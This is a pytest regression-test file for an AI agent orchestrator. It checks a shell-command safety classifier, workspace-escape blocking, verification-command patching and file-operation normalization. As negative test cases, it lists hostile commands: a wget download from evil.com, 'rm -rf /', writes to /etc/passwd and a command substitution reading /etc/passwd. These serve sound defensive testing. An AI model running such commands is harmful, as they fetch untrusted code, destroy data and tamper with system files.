"""Phase 10G AMD/openai_responses_api regression tests.

Covers defects found and fixed during the 2026-05-20 AMD llama.cpp smoke.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch
import pytest


# ---------------------------------------------------------------------------
# Fix 1: OpenAIResponsesRuntime.execute_task must accept **kwargs
# ---------------------------------------------------------------------------


class TestOpenAIAdapterKwargs:
    def test_execute_task_accepts_reuse_task_session(self):
        """execute_task must not raise TypeError when called with reuse_task_session."""
        from app.services.agents.providers.openai_adapter import OpenAIResponsesRuntime
        import inspect

        sig = inspect.signature(OpenAIResponsesRuntime.execute_task)
        params = sig.parameters
        assert "kwargs" in params or any(
            p.kind == inspect.Parameter.VAR_KEYWORD for p in params.values()
        ), "execute_task must accept **kwargs to absorb unknown keyword args from orchestration layer"

    def test_execute_task_accepts_diagnostic_kwargs(self):
        """execute_task must accept all known orchestration kwargs without error."""
        from app.services.agents.providers.openai_adapter import OpenAIResponsesRuntime
        import inspect

        sig = inspect.signature(OpenAIResponsesRuntime.execute_task)
        params = sig.parameters
        known_kwargs = ["diagnostic_label", "diagnostic_metadata"]
        for kw in known_kwargs:
            assert kw in params, f"execute_task missing expected kwarg: {kw}"


# ---------------------------------------------------------------------------
# Fix 2: _is_safe_local_shell_command detection
# ---------------------------------------------------------------------------


class TestSafeLocalShellCommandDetection:
    def _fn(self):
        from app.services.orchestration.phases.execution_loop import (
            _is_safe_local_shell_command,
        )

        return _is_safe_local_shell_command

    def test_echo_redirect_is_safe(self):
        fn = self._fn()
        assert fn("echo 'hello world' > README.md")
        assert fn("echo -e '# Title\\n\\nBody' > README.md")
        assert fn("printf '%s\\n' 'line1' > out.txt")

    def test_mkdir_is_safe(self):
        fn = self._fn()
        assert fn("mkdir -p src/components")
        assert fn("mkdir docs")

    def test_touch_is_safe(self):
        fn = self._fn()
        assert fn("touch requirements.txt")

    def test_blocked_commands_not_safe(self):
        fn = self._fn()
        assert not fn("curl https://example.com > file.txt")
        assert not fn("wget http://evil.com/script.sh")
        assert not fn("pip install malware")
        assert not fn("rm -rf /")
        assert not fn("sudo echo 'x' > /etc/passwd")
        assert not fn("echo $(cat /etc/passwd) > out.txt")

    def test_read_only_commands_not_safe(self):
        """Read-only commands should not match — they go via inspection path."""
        fn = self._fn()
        assert not fn("ls -la")
        assert not fn("cat README.md")
        assert not fn("python -c \"import sys; print('hi')\"")

    def test_empty_command_not_safe(self):
        fn = self._fn()
        assert not fn("")
        assert not fn("   ")


# ---------------------------------------------------------------------------
# Fix 2b: _execute_local_shell_commands_step integration
# ---------------------------------------------------------------------------


class TestExecuteLocalShellCommandsStep:
    def test_echo_redirect_creates_file(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["echo 'Hello World' > hello.txt"],
            verification_command=None,
        )
        assert result is not None
        assert result["status"] == "completed"
        assert (tmp_path / "hello.txt").exists()
        assert "hello.txt" in result["files_changed"]

    def test_mkdir_creates_dir(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["mkdir -p src/components"],
            verification_command=None,
        )
        assert result is not None
        assert result["status"] == "completed"
        assert (tmp_path / "src" / "components").is_dir()

    def test_returns_none_for_unsafe_command(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["curl https://example.com > out.txt"],
            verification_command=None,
        )
        assert result is None, "unsafe command must return None (fall through to LLM)"

    def test_verification_runs_after_commands(self, tmp_path: Path):
        import sys as _sys
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        py = _sys.executable
        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["echo 'hello' > greet.txt"],
            verification_command=f"{py} -c \"import pathlib,sys; sys.exit(0 if pathlib.Path('greet.txt').exists() else 1)\"",
        )
        assert result is not None
        assert result["status"] == "completed"

    def test_failed_verification_returns_failed(self, tmp_path: Path):
        import sys as _sys
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        py = _sys.executable
        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["mkdir -p mydir"],
            verification_command=f"{py} -c \"import pathlib,sys; sys.exit(0 if pathlib.Path('nonexistent.txt').exists() else 1)\"",
        )
        assert result is not None
        assert result["status"] == "failed"

    def test_workspace_escape_blocked(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["touch ../../escape.txt"],
            verification_command=None,
        )
        assert result is None, "path escape must return None (safety fallback)"

    def test_absolute_redirection_target_blocked(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["echo 'escape' > /tmp/orchestrator-escape.txt"],
            verification_command=None,
        )
        assert result is None, "absolute redirect target must not run locally"

    def test_absolute_touch_target_blocked(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["touch /tmp/orchestrator-escape.txt"],
            verification_command=None,
        )
        assert result is None, "absolute touch target must not run locally"

    def test_windows_absolute_target_blocked(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=[r"echo 'escape' > C:\Users\Public\escape.txt"],
            verification_command=None,
        )
        assert result is None, "Windows absolute target must not run locally"


# ---------------------------------------------------------------------------
# Fix 3: _patch_python_verification_cmd auto-injects 'import sys'
# ---------------------------------------------------------------------------


class TestPatchPythonVerificationCmd:
    def _fn(self):
        from app.services.orchestration.phases.execution_loop import (
            _patch_python_verification_cmd,
        )

        return _patch_python_verification_cmd

    def test_injects_import_sys_when_missing(self):
        fn = self._fn()
        cmd = "python3 -c \"import pathlib; sys.exit(0 if pathlib.Path('utils.py').exists() else 1)\""
        out = fn(cmd)
        assert "import sys" in out

    def test_does_not_duplicate_import_sys(self):
        fn = self._fn()
        cmd = "python3 -c \"import sys; import pathlib; sys.exit(0 if pathlib.Path('f.py').exists() else 1)\""
        out = fn(cmd)
        assert out == cmd

    def test_leaves_non_python_commands_unchanged(self):
        fn = self._fn()
        for cmd in ("ls -la", 'node -e "process.exit(0)"', "pytest app/tests"):
            assert fn(cmd) == cmd

    def test_leaves_python_without_sys_unchanged(self):
        fn = self._fn()
        cmd = "python3 -c \"import pathlib; print(pathlib.Path('f.py').exists())\""
        assert fn(cmd) == cmd

    def test_patched_command_actually_runs(self, tmp_path: Path):
        """Patched verification command must execute without NameError."""
        import subprocess

        fn = self._fn()
        cmd = "python3 -c \"import pathlib; sys.exit(0 if pathlib.Path('dummy.txt').exists() else 1)\""
        patched = fn(cmd)
        result = subprocess.run(
            patched,
            shell=True,
            cwd=tmp_path,
            capture_output=True,
            text=True,
        )
        assert result.returncode in (0, 1), f"NameError or crash: {result.stderr}"
        assert "NameError" not in result.stderr

    def test_configparser_verification_runs_as_simple_local_check(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_simple_verification_step,
        )

        (tmp_path / "setup.cfg").write_text(
            "[metadata]\nname = myapp\nversion = 0.1.0\n", encoding="utf-8"
        )
        command = (
            'python -c "import configparser,sys; '
            "config = configparser.ConfigParser(); config.read('setup.cfg'); "
            "sys.exit(0 if config.has_section('metadata') and "
            "config['metadata']['name'] == 'myapp' else 1)\""
        )

        result = _execute_simple_verification_step(
            project_dir=tmp_path,
            commands=[command],
            verification_command=command,
        )

        assert result is not None
        assert result["status"] == "completed"

    def test_module_assert_verification_runs_as_simple_local_check(
        self, tmp_path: Path
    ):
        from app.services.orchestration.phases.execution_loop import (
            _execute_simple_verification_step,
        )

        (tmp_path / "utils.py").write_text(
            "def multiply(a, b):\n    return a * b\n", encoding="utf-8"
        )
        command = 'python -c "import utils; assert utils.multiply(2, 3) == 6"'

        result = _execute_simple_verification_step(
            project_dir=tmp_path,
            commands=[command],
            verification_command=command,
        )

        assert result is not None
        assert result["status"] == "completed"


# ---------------------------------------------------------------------------
# Fix 4: normalize invalid one-line try/except exception checks
# ---------------------------------------------------------------------------


class TestPythonInlineExceptionAssertionNormalization:
    def test_invalid_try_except_one_liner_rewrites_to_assert_raises(
        self, tmp_path: Path
    ):
        from app.services.orchestration.validation.workspace_guard import (
            normalize_command,
        )

        commands = (
            (
                'python -c "import utils; assert utils.multiply(2, 3) == 6; '
                "try: utils.divide(1, 0); assert False, 'Expected ZeroDivisionError' "
                'except ZeroDivisionError: pass"'
            ),
            (
                'python -c "import utils; assert utils.multiply(2, 3) == 6; '
                "try: utils.divide(1, 0); except ZeroDivisionError: pass "
                'else: assert False"'
            ),
        )

        for command in commands:
            normalized = normalize_command(command, tmp_path)

            assert "unittest.TestCase().assertRaises" in normalized
            assert "try:" not in normalized

    def test_normalized_exception_assertion_runs(self, tmp_path: Path):
        import subprocess
        import sys
        from app.services.orchestration.validation.workspace_guard import (
            normalize_command,
        )

        (tmp_path / "utils.py").write_text(
            "\n".join(
                [
                    "def multiply(a, b):",
                    "    return a * b",
                    "",
                    "def divide(a, b):",
                    "    if b == 0:",
                    "        raise ZeroDivisionError('Cannot divide by zero')",
                    "    return a / b",
                ]
            ),
            encoding="utf-8",
        )
        command = (
            'python -c "import utils; assert utils.multiply(2, 3) == 6; '
            "try: utils.divide(1, 0); assert False, 'Expected ZeroDivisionError' "
            'except ZeroDivisionError: pass"'
        )

        normalized = normalize_command(command, tmp_path).replace(
            "python -c", f"{sys.executable} -c", 1
        )
        result = subprocess.run(
            normalized,
            shell=True,
            cwd=tmp_path,
            capture_output=True,
            text=True,
        )

        assert result.returncode == 0, result.stderr


# ---------------------------------------------------------------------------
# Fix 5: normalize create-file replace_in_file plans from llama.cpp
# ---------------------------------------------------------------------------


class TestCreateFileReplaceInFileNormalization:
    def test_missing_file_replace_with_stub_old_becomes_write_file(
        self, tmp_path: Path
    ):
        from app.services.orchestration.validation.workspace_guard import (
            normalize_file_ops,
        )

        for placeholder in ("# Your code here", "# Add your utility functions here"):
            ops = normalize_file_ops(
                [
                    {
                        "op": "replace_in_file",
                        "path": "utils.py",
                        "old": placeholder,
                        "new": "def multiply(a, b):\n    return a * b\n",
                    }
                ],
                tmp_path,
            )

            assert ops == [
                {
                    "op": "write_file",
                    "path": "utils.py",
                    "content": "def multiply(a, b):\n    return a * b\n",
                }
            ]

    def test_existing_file_replace_stays_replace_in_file(self, tmp_path: Path):
        from app.services.orchestration.validation.workspace_guard import (
            normalize_file_ops,
        )

        (tmp_path / "utils.py").write_text("# Your code here\n", encoding="utf-8")
        ops = normalize_file_ops(
            [
                {
                    "op": "replace_in_file",
                    "path": "utils.py",
                    "old": "# Your code here",
                    "new": "def multiply(a, b):\n    return a * b\n",
                }
            ],
            tmp_path,
        )

        assert ops[0]["op"] == "replace_in_file"
        assert ops[0]["old"] == "# Your code here"

    def test_empty_existing_file_replace_with_empty_old_becomes_write_file(
        self, tmp_path: Path
    ):
        from app.services.orchestration.validation.workspace_guard import (
            normalize_file_ops,
        )

        (tmp_path / "utils.py").write_text("", encoding="utf-8")
        ops = normalize_file_ops(
            [
                {
                    "op": "replace_in_file",
                    "path": "utils.py",
                    "old": "",
                    "new": "def multiply(a, b):\n    return a * b\n",
                }
            ],
            tmp_path,
        )

        assert ops[0]["op"] == "write_file"
        assert ops[0]["content"] == "def multiply(a, b):\n    return a * b\n"
